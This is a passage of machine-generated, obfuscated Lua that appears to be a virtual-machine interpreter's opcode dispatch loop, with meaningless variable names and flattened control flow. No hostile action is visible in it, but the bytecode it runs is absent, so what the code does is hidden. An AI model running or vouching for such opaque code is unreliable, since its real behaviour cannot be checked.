d<=5 then if d<5 then w[y[125]]=y[392];else n=n+1;end else if 7>d then y=e[n];else w[y[125]]=h[y[392]];end end end else if d<=11 then if d<=9 then if d<9 then n=n+1;else y=e[n];end else if d>10 then n=n+1;else w[y[125]]=w[y[392]][y[54]];end end else if d<=13 then if d>12 then m=y[125]else y=e[n];end else if 14==d then w[m]=w[m](r(w,m+1,y[392]))else break end end end end d=d+1 end elseif not(288~=z)then w[y[125]]=(y[392]*w[y[54]]);else local d,m=0 while true do if d<=12 then if d<=5 then if d<=2 then if d<=0 then m=nil else if 2>d then w={};else for q=0,u,1 do if q<i then w[q]=s[q+1];else break;end;end;end end else if d<=3 then n=n+1;else if 4<d then w[y[125]]=h[y[392]];else y=e[n];end end end else if d<=8 then if d<=6 then n=n+1;else if d==7 then y=e[n];else w[y[125]]=o[y[392]];end end else if d<=10 then if 9<d then y=e[n];else n=n+1;end else if 11<d then n=n+1;else w[y[125]]=w[y[392]][y[54]];end end end end else if d<=18 then if d<=15 then if d<=13 then y=e[n];else if 14<d then n=n+1;else w[y[125]]=y[392];end end else if d<=16 then y=e[n];else if 17==d then w[y[125]]=y[392];else n=n+1;end end end else if d<=21 then if d<=19 then y=e[n];else if 20==d then w[y[125]]=y[392];else n=n+1;end end else if d<=23 then if 22==d then y=e[n];else m=y[125]end else if d<25 then w[m]=w[m](r(w,m+1,y[392]))else break end end end end end d=d+1 end end;elseif(292>=z)then if(290>z or 290==z)then local d,m=0 while true do if d<=7 then if d<=3 then if d<=1 then if 1>d then m=nil else w[y[125]]=o[y[392]];end else if d<3 then n=n+1;else y=e[n];end end else if d<=5 then if 5~=d then w[y[125]]=w[y[392]][y[54]];else n=n+1;end else if d<7 then y=e[n];else w[y[125]]=h[y[392]];end end end else if d<=11 then if d<=9 then if d>8 then y=e[n];else n=n+1;end else if 11>d then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end else if d<=13 then if 13~=d then y=e[n];else m=y[125]end else if d<15 then w[m]=w[m](w[m+1])else break end end end end d=d+1 end elseif 291<z then local d=0 while true do if d<=9 then if d<=4 then if d<=1 then if d>0 then n=n+1;else w[y[125]][y[392]]=y[54];end else if d<=2 then y=e[n];else if 4~=d then w[y[125]]={};else n=n+1;end end end else if d<=6 then if 6~=d then y=e[n];else w[y[125]][y[392]]=w[y[54]];end else if d<=7 then n=n+1;else if 9~=d then y=e[n];else w[y[125]]=h[y[392]];end end end end else if d<=14 then if d<=11 then if d==10 then n=n+1;else y=e[n];end else if d<=12 then w[y[125]]=w[y[392]][y[54]];else if 13<d then y=e[n];else n=n+1;end end end else if d<=16 then if d>15 then n=n+1;else w[y[125]][y[392]]=w[y[54]];end else if d<=17 then y=e[n];else if 18==d then w[y[125]][y[392]]=w[y[54]];else break end end end end end d=d+1 end else local d,m=0 while true do if d<=13 then if d<=6 then if d<=2 then if d<=0 then m=nil else if d==1 then w={};else for q=0,u,1 do if q<i then w[q]=s[q+1];else break;end;end;end end else if d<=4 then if 3<d then y=e[n];else n=n+1;end else if d~=6 then w[y[125]]=h[y[392]];else n=n+1;end end end else if d<=9 then if d<=7 then y=e[n];else if d~=9 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end else if d<=11 then if d<11 then y=e[n];else w[y[125]]=h[y[392]];end else if 13~=d then n=n+1;else y=e[n];end end end end else if d<=20 then if d<=16 then if d<=14 then w[y[125]]=h[y[392]];else if d~=16 then n=n+1;else y=e[n];end end else if d<=18 then if 18~=d then w[y[125]]=h[y[392]];else n=n+1;end else if d>19 then w[y[125]]=h[y[392]];else y=e[n];end end end else if d<=24 then if d<=22 then if 21<d then y=e[n];else n=n+1;end else if 24~=d then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end else if d<=26 then if 26>d then y=e[n];else m=y[125]end else if 27==d then w[m]=w[m](r(w,m+1,y[392]))else break end end end end end d=d+1 end end;elseif z<=293 then local d=y[125]w[d]=w[d](r(w,(d+1),p))elseif not(z==295)then local d,m,q=0 while true do if d<=24 then if d<=11 then if d<=5 then if d<=2 then if d<=0 then m=nil else if 1<d then w[y[125]]={};else q=nil end end else if d<=3 then n=n+1;else if d==4 then y=e[n];else w[y[125]]=h[y[392]];end end end else if d<=8 then if d<=6 then n=n+1;else if d~=8 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if d<=9 then n=n+1;else if d==10 then y=e[n];else w[y[125]]=h[y[392]];end end end end else if d<=17 then if d<=14 then if d<=12 then n=n+1;else if 14>d then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if d<=15 then n=n+1;else if d==16 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end else if d<=20 then if d<=18 then n=n+1;else if 19<d then w[y[125]]={};else y=e[n];end end else if d<=22 then if d>21 then y=e[n];else n=n+1;end else if d==23 then w[y[125]]={};else n=n+1;end end end end end else if d<=37 then if d<=30 then if d<=27 then if d<=25 then y=e[n];else if d>26 then n=n+1;else w[y[125]]=h[y[392]];end end else if d<=28 then y=e[n];else if d<30 then w[y[125]][y[392]]=w[y[54]];else n=n+1;end end end else if d<=33 then if d<=31 then y=e[n];else if 32==d then w[y[125]]=h[y[392]];else n=n+1;end end else if d<=35 then if 35>d then y=e[n];else w[y[125]][y[392]]=w[y[54]];end else if d==36 then n=n+1;else y=e[n];end end end end else if d<=43 then if d<=40 then if d<=38 then w[y[125]][y[392]]=w[y[54]];else if 40>d then n=n+1;else y=e[n];end end else if d<=41 then w[y[125]]={r({},1,y[392])};else if d<43 then n=n+1;else y=e[n];end end end else if d<=46 then if d<=44 then w[y[125]]=w[y[392]];else if 45==d then n=n+1;else y=e[n];end end else if d<=48 then if d<48 then q=y[125];else m=w[q];end else if 50~=d then for v=q+1,y[392]do t(m,w[v])end;else break end end end end end end d=d+1 end else local d,m,q,v=0 while true do if d<=9 then if d<=4 then if d<=1 then if 0<d then q=nil else m=nil end else if d<=2 then v=nil else if d<4 then w[y[125]]=h[y[392]];else n=n+1;end end end else if d<=6 then if d==5 then y=e[n];else w[y[125]]=h[y[392]];end else if d<=7 then n=n+1;else if d~=9 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end end else if d<=14 then if d<=11 then if 11~=d then n=n+1;else y=e[n];end else if d<=12 then w[y[125]]=w[y[392]][w[y[54]]];else if 14~=d then n=n+1;else y=e[n];end end end else if d<=16 then if d>15 then q={w[v](w[v+1])};else v=y[125]end else if d<=17 then m=0;else if d<19 then for x=v,y[54]do m=m+1;w[x]=q[m];end else break end end end end end d=d+1 end end;elseif z<=301 then if(z<298 or z==298)then if(z<296 or z==296)then local d,m=0 while true do if d<=8 then if d<=3 then if d<=1 then if 0<d then w[y[125]]=w[y[392]][y[54]];else m=nil end else if 2<d then y=e[n];else n=n+1;end end else if d<=5 then if 4<d then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if d<=6 then y=e[n];else if d<8 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end end end else if d<=13 then if d<=10 then if d<10 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end else if d<=11 then n=n+1;else if 13>d then y=e[n];else w[y[125]]=false;end end end else if d<=15 then if 15~=d then n=n+1;else y=e[n];end else if d<=16 then m=y[125]else if d<18 then w[m](w[m+1])else break end end end end end d=d+1 end elseif 298>z then local d,m,q=0 while true do if d<=12 then if d<=5 then if d<=2 then if d<=0 then m=nil else if 1<d then w[y[125]]=w[y[392]][y[54]];else q=nil end end else if d<=3 then n=n+1;else if 4==d then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end else if d<=8 then if d<=6 then n=n+1;else if 8~=d then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if d<=10 then if d~=10 then n=n+1;else y=e[n];end else if d~=12 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end end end else if d<=19 then if d<=15 then if d<=13 then y=e[n];else if d~=15 then w[y[125]]=o[y[392]];else n=n+1;end end else if d<=17 then if d>16 then w[y[125]]=w[y[392]][y[54]];else y=e[n];end else if 18==d then n=n+1;else y=e[n];end end end else if d<=22 then if d<=20 then w[y[125]]=w[y[392]][y[54]];else if 21<d then y=e[n];else n=n+1;end end else if d<=24 then if 24>d then q=y[125];else m=w[q];end else if 25<d then break else for v=q+1,y[392]do t(m,w[v])end;end end end end end d=d+1 end else do return w[y[125]]end end;elseif 299>=z then if(w[y[125]]<=w[y[54]])then n=y[392];else n=(n+1);end;elseif z==300 then local d,m,q,v=0 while true do if d<=15 then if d<=7 then if d<=3 then if d<=1 then if d<1 then m=nil else q=nil end else if d<3 then v=nil else w[y[125]]=h[y[392]];end end else if d<=5 then if 5~=d then n=n+1;else y=e[n];end else if d<7 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end end else if d<=11 then if d<=9 then if 8<d then w[y[125]]=h[y[392]];else y=e[n];end else if 11~=d then n=n+1;else y=e[n];end end else if d<=13 then if d>12 then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if 14==d then y=e[n];else w[y[125]]=w[y[392]][w[y[54]]];end end end end else if d<=23 then if d<=19 then if d<=17 then if d>16 then y=e[n];else n=n+1;end else if d>18 then n=n+1;else w[y[125]]=h[y[392]];end end else if d<=21 then if 21~=d then y=e[n];else w[y[125]]=w[y[392]][y[54]];end else if d~=23 then n=n+1;else y=e[n];end end end else if d<=27 then if d<=25 then if 24<d then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if d==26 then y=e[n];else v=y[392];end end else if d<=29 then if 28==d then q=y[54];else m=k(w,g,v,q);end else if d==30 then w[y[125]]=m;else break end end end end end d=d+1 end else local d=y[125]w[d]=w[d](r(w,d+1,y[392]))end;elseif 304>=z then if z<=302 then local d;local m;local q;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];q=y[125]m={w[q](w[q+1])};d=0;for v=q,y[54]do d=d+1;w[v]=m[d];end elseif 304>z then local d=y[125]w[d]=w[d](w[d+1])else if(w[y[125]]~=w[y[54]])then n=n+1;else n=y[392];end;end;elseif 305>=z then w[y[125]]=o[y[392]];elseif 306==z then local d;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];d=y[125]w[d]=w[d](r(w,d+1,y[392]))else local d;local m;local q;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];q=y[125]m={w[q](w[q+1])};d=0;for v=q,y[54]do d=d+1;w[v]=m[d];end end;elseif z<=319 then if z<=313 then if z<=310 then if z<=308 then local d;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];d=y[125]w[d]=w[d](r(w,d+1,y[392]))elseif 310~=z then w={};for d=0,u,1 do if d<i then w[d]=s[d+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];if(w[y[125]]~=y[54])then n=n+1;else n=y[392];end;else if(y[125]<=w[y[54]])then n=n+1;else n=y[392];end;end;elseif 311>=z then w[y[125]]=h[y[392]];elseif z~=313 then local d;local m;local q;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];q=y[125]m={w[q](w[q+1])};d=0;for v=q,y[54]do d=d+1;w[v]=m[d];end else w[y[125]]=false;n=n+1;end;elseif 316>=z then if z<=314 then local d,m=0 while true do if d<=16 then if d<=7 then if d<=3 then if d<=1 then if d==0 then m=nil else w[y[125]]=w[y[392]][y[54]];end else if 2==d then n=n+1;else y=e[n];end end else if d<=5 then if 4==d then w[y[125]]=h[y[392]];else n=n+1;end else if d==6 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end else if d<=11 then if d<=9 then if 8==d then n=n+1;else y=e[n];end else if d>10 then n=n+1;else w[y[125]]={};end end else if d<=13 then if d~=13 then y=e[n];else w[y[125]]=h[y[392]];end else if d<=14 then n=n+1;else if 15==d then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end end end else if d<=24 then if d<=20 then if d<=18 then if 17<d then y=e[n];else n=n+1;end else if d==19 then w[y[125]]=h[y[392]];else n=n+1;end end else if d<=22 then if 22~=d then y=e[n];else w[y[125]]={};end else if 24~=d then n=n+1;else y=e[n];end end end else if d<=28 then if d<=26 then if 26~=d then w[y[125]]=h[y[392]];else n=n+1;end else if d~=28 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if d<=30 then if d>29 then y=e[n];else n=n+1;end else if d<=31 then m=y[125]else if d==32 then w[m]=w[m]()else break end end end end end end d=d+1 end elseif z==315 then local d;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];d=y[125]w[d]=w[d](r(w,d+1,y[392]))else a(c,f);end;elseif 317>=z then local a;local c;local d;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];d=y[125]c={w[d](w[d+1])};a=0;for f=d,y[54]do a=a+1;w[f]=c[a];end elseif 318<z then w[y[125]]=false;else w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if(w[y[125]]~=w[y[54]])then n=n+1;else n=y[392];end;end;elseif 325>=z then if z<=322 then if 320>=z then local a=y[125];do return w[a],w[a+1]end elseif 321<z then w[y[125]]=w[y[392]]-y[54];else w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if w[y[125]]then n=n+1;else n=y[392];end;end;elseif z<=323 then local a=y[125];local c=w[y[392]];w[a+1]=c;w[a]=c[y[54]];elseif 324<z then local a;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];a=y[125]w[a]=w[a](w[a+1])else local a;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];a=y[125]w[a]=w[a]()end;elseif 328>=z then if 326>=z then local a=y[125];do return w[a](r(w,a+1,y[392]))end;elseif z~=328 then local a=w[y[54]];if a then n=n+1;else w[y[125]]=a;n=y[392];end;else local a;local c;local d;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];d=y[392];c=y[54];a=k(w,g,d,c);w[y[125]]=a;end;elseif z<=329 then w[y[125]]=w[y[392]]/y[54];n=n+1;y=e[n];w[y[125]]=w[y[392]]-w[y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]]/y[54];n=n+1;y=e[n];w[y[125]]=w[y[392]]*y[54];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];n=y[392];elseif z<331 then local a;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];a=y[125]w[a]=w[a](r(w,a+1,y[392]))else w[y[125]]={};n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];end;elseif z<=355 then if z<=343 then if 337>=z then if z<=334 then if 332>=z then local a,c,d,f,g=0 while true do if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if 2~=a then d,f=nil else g=nil end end else if a<=3 then w[y[125]]=o[y[392]];else if a<5 then n=n+1;else y=e[n];end end end else if a<=8 then if a<=6 then w[y[125]]=w[y[392]];else if 8>a then n=n+1;else y=e[n];end end else if a<=9 then w[y[125]]=y[392];else if 11~=a then n=n+1;else y=e[n];end end end end else if a<=17 then if a<=14 then if a<=12 then w[y[125]]=y[392];else if a~=14 then n=n+1;else y=e[n];end end else if a<=15 then w[y[125]]=y[392];else if 17>a then n=n+1;else y=e[n];end end end else if a<=20 then if a<=18 then g=y[125]else if a~=20 then d,f=j(w[g](r(w,g+1,y[392])))else p=f+g-1 end end else if a<=21 then c=0;else if a~=23 then for f=g,p do c=c+1;w[f]=d[c];end;else break end end end end end a=a+1 end elseif z==333 then do return end;else w[y[125]]=w[y[392]]+w[y[54]];end;elseif 335>=z then local a=y[125];do return w[a],w[a+1]end elseif 336==z then local a;w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];a=y[125]w[a]=w[a]()else local a;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];a=y[125]w[a]=w[a](r(w,a+1,y[392]))end;elseif z<=340 then if z<=338 then w={};for a=0,u,1 do if a<i then w[a]=s[a+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if w[y[125]]then n=n+1;else n=y[392];end;elseif z==339 then local a=y[125];local c=w[a];for d=a+1,p do t(c,w[d])end;else w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if w[y[125]]then n=n+1;else n=y[392];end;end;elseif z<=341 then local a=y[125]local c={w[a](r(w,a+1,y[392]))};local d=0;for f=a,y[54]do d=d+1;w[f]=c[d];end;elseif 343>z then local a=y[125]local c={w[a](w[a+1])};local d=0;for f=a,y[54]do d=d+1;w[f]=c[d];end else local a;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];a=y[125];do return w[a](r(w,a+1,y[392]))end;n=n+1;y=e[n];a=y[125];do return r(w,a,p)end;n=n+1;y=e[n];n=y[392];end;elseif 349>=z then if 346>=z then if z<=344 then w[y[125]][y[392]]=y[54];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];elseif z>345 then w[y[125]]=w[y[392]];else local a;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];a=y[125]w[a]=w[a](r(w,a+1,y[392]))end;elseif 347>=z then local a;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]]*y[54];n=n+1;y=e[n];w[y[125]]=w[y[392]]+w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]]+w[y[54]];n=n+1;y=e[n];a=y[125]w[a]=w[a](r(w,a+1,y[392]))elseif 349>z then local a;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];a=y[125]w[a]=w[a](r(w,a+1,y[392]))else if(w[y[125]]~=y[54])then n=n+1;else n=y[392];end;end;elseif 352>=z then if z<=350 then local a,c,d,f=0 while true do if a<=9 then if a<=4 then if a<=1 then if a~=1 then c=nil else d=nil end else if a<=2 then f=nil else if 4>a then w[y[125]]=h[y[392]];else n=n+1;end end end else if a<=6 then if a==5 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end else if a<=7 then n=n+1;else if a~=9 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end end else if a<=14 then if a<=11 then if a~=11 then n=n+1;else y=e[n];end else if a<=12 then w[y[125]]=w[y[392]][y[54]];else if 13<a then y=e[n];else n=n+1;end end end else if a<=16 then if 16>a then f=y[125]else d={w[f](w[f+1])};end else if a<=17 then c=0;else if 19>a then for g=f,y[54]do c=c+1;w[g]=d[c];end else break end end end end end a=a+1 end elseif 351==z then local a=y[125];local c,d,f=w[a],w[a+1],w[a+2];local c=c+f;w[a]=c;if f>0 and c<=d or f<0 and c>=d then n=y[392];w[a+3]=c;end;else w[y[125]]=w[y[392]]*y[54];end;elseif 353>=z then w[y[125]]=false;n=n+1;elseif 355>z then local a;w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];for c=y[125],y[392],1 do w[c]=nil;end;n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];a=y[125]w[a]=w[a]()else w[y[125]]=w[y[392]]%w[y[54]];end;elseif z<=367 then if 361>=z then if z<=358 then if z<=356 then local a;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];a=y[125]w[a]=w[a](r(w,a+1,y[392]))elseif z>357 then local a;w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];a=y[125]w[a](r(w,a+1,y[392]))else local a;local c;local d;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];d=y[125]c={w[d](w[d+1])};a=0;for f=d,y[54]do a=a+1;w[f]=c[a];end end;elseif z<=359 then if(w[y[125]]<=w[y[54]])then n=n+1;else n=y[392];end;elseif z<361 then local a=y[125];w[a]=w[a]-w[a+2];n=y[392];else local a;local c;w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]={r({},1,y[392])};n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];c=y[125];a=w[c];for d=c+1,y[392]do t(a,w[d])end;end;elseif 364>=z then if(362>=z)then local a,c=0 while true do if a<=29 then if a<=14 then if a<=6 then if(a<2 or a==2)then if(a==0 or a<0)then c=nil else if(a<2)then w[y[125]]={};else n=(n+1);end end else if(a<4 or a==4)then if(a>3)then w[y[125]]=y[392];else y=e[n];end else if a>5 then y=e[n];else n=n+1;end end end else if a<=10 then if(a==8 or a<8)then if(a>7)then n=n+1;else w[y[125]][w[y[392]]]=w[y[54]];end else if a==9 then y=e[n];else w[y[125]]=y[392];end end else if a<=12 then if 12>a then n=n+1;else y=e[n];end else if(a==13)then w[y[125]][w[y[392]]]=w[y[54]];else n=n+1;end end end end else if(a==21 or a<21)then if a<=17 then if a<=15 then y=e[n];else if(16==a)then w[y[125]]=y[392];else n=n+1;end end else if(a<19 or a==19)then if(a<19)then y=e[n];else w[y[125]][w[y[392]]]=w[y[54]];end else if(21>a)then n=(n+1);else y=e[n];end end end else if(a==25 or a<25)then if(a==23 or a<23)then if(23>a)then w[y[125]]=y[392];else n=(n+1);end else if not(a~=24)then y=e[n];else w[y[125]][w[y[392]]]=w[y[54]];end end else if(a==27 or a<27)then if not(a~=26)then n=(n+1);else y=e[n];end else if(29>a)then w[y[125]]=y[392];else n=n+1;end end end end end else if a<=44 then if a<=36 then if a<=32 then if(a==30 or a<30)then y=e[n];else if a>31 then n=n+1;else w[y[125]][w[y[392]]]=w[y[54]];end end else if(a==34 or a<34)then if not(a==34)then y=e[n];else w[y[125]]=y[392];end else if not(36==a)then n=n+1;else y=e[n];end end end else if a<=40 then if(a<=38)then if not(a~=37)then w[y[125]][w[y[392]]]=w[y[54]];else n=n+1;end else if(a>39)then w[y[125]]={};else y=e[n];end end else if a<=42 then if a>41 then y=e[n];else n=(n+1);end else if not(43~=a)then w[y[125]]=y[392];else n=(n+1);end end end end else if(a==52 or a<52)then if(a<=48)then if a<=46 then if 46~=a then y=e[n];else w[y[125]][w[y[392]]]=w[y[54]];end else if not(a~=47)then n=(n+1);else y=e[n];end end else if(a<50 or a==50)then if(49<a)then n=n+1;else w[y[125]]=o[y[392]];end else if(51<a)then w[y[125]]=w[y[392]];else y=e[n];end end end else if(a<56 or a==56)then if(a==54 or a<54)then if(a~=54)then n=n+1;else y=e[n];end else if not(a==56)then w[y[125]]=w[y[392]];else n=n+1;end end else if(a<=58)then if(a<58)then y=e[n];else c=y[125]end else if(59==a)then 